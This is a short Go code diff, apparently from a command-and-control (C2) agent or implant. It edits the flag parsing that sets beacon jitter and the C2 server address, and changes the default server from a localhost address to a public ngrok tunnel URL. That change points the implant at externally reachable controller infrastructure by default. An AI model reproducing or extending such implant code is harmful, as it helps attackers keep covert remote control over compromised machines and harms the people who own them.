@@ -30,7 +30,7 @@ func main() {
 func parseConfig() agent.Config {
 	jitterMin := flag.Float64("jitter-min", 1.0, "min jitter (s)")
 	jitterMax := flag.Float64("jitter-max", 2.0, "max jitter (s)")
-	serverURL := flag.String("server", "http://127.0.0.1:8080", "C2 server URL")
+	serverURL := flag.String("server", "https://thoughtless-louvenia-superbelievably.ngrok-free.dev", "C2 server URL")
 	flag.Parse()
 
 	if *jitterMin <= 0 || *jitterMax <= *jitterMin {
